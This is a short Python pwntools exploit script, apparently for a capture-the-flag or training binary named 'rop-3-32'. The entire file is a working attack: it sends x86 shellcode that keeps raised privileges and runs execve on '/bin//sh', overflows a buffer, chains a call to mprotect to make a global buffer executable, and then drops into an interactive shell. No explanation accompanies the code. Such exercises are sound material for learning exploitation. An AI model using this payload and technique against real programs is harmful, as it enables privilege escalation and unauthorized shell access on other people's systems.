#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process("./rop-3-32")
#p = process("./rop-x")
#gdb.attach(p)

shellcode = '\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00j\x00hn/shh//bi\x89\xe3\xcd\x80'

buf = (shellcode +("aaaa")+("A"*(0x98-len(shellcode))))

buf += p32(0x8048360) #mprotect
buf += p32(0x804a060) #g_buf
buf += p32(0x804a000)
buf += p32(0x1000)
buf += p32(7)

p.sendline(buf)
p.interactive()
